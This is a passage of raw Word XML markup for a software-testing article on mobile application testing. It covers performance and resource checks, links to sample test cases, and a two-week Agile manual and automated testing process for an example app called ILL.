        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>– It’s important to keep a track of battery consumption while running application on the mobile devices.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="448" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="449" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The speed of the application- </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>the response time on different devices, with different memory parameters, with different network types etc.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="450" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="451" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Data requirements </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>– For installation as well as to verify if the user with the limited data plan will able to download it.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="452" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="453" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Memory requirement</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>– again, to download, install and run</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="454" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The functionality of the application</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>– make sure application is not crashing due to network failure or anything else.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:ins w:id="455" w:author="Unknown"/>
          <w:rFonts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56" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="457" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Download</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t> Some Sample Test Cases for Testing Mobile Applications:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="458" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="459" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>=&gt; </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2014/03/Mobile-Application-Sample-Test-Cases.xls" \o "Mobile testing test cases" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="777777"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Download Mobile app sample test cases</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="460" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="461" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Typical activities and proceedings in Testing Mobile Application</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:br/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="462" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="463" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The scope of the testing depends on a number of requirements to be checked or the extent of changes made to the app. If the changes are few, a round of </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>sanity</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> testing will do. In case of major and/or complex changes, a </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>full regression</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> is recommended.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="464" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="465" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>An example application testing project</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>: ILL (International Learn Lab) is an application designed to help admin, publisher to create websites in collaboration. Using a web browser, instructors choose from a set of features to create a class that meets their requirements.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="466" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="467" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Mobile Testing process:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="468" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="469" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Step #1.</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> Identify the </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/types-of-software-testing/" \o "Testing types" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>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types of testing</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>: As an ILL application is applicable for browsers, so it’s mandatory to test this application on all supported browsers using different mobile devices. We need to do </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>usability, functional</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> and </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>compatibility</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> testing on different browsers with the </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>combinations</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> of </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>manual</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> and </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>automation</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> test cases.</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70" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="471" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Step #2.</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">Manual and </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Automated</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> testing:</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> The methodology followed for this project is Agile with the iteration of two weeks. Every two weeks dev. team releases a new build to testing team and testing team will run their test cases on QA environment. Automation team creates scripts for the set of basic functionality and runs the scripts that help determine if the new build is stable enough to test. The Manual testing team will test the new functionality.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="472" w:author="Unknown"/>
